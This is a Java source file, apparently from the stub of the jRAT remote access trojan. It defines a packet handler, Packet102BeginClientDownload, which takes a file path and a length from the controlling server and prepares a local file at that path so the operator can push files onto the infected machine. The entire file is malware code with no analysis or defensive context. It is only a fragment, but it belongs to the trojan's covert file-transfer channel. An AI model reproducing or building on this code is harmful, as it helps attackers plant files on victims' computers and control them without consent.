package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;


public class Packet102BeginClientDownload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String remote = Connection.readLine();
		
		long l = Connection.readLong();
		
		TransferData d = new TransferData();
		d.local = new File(remote);
		FileCache.put(remote, d);
	}

}
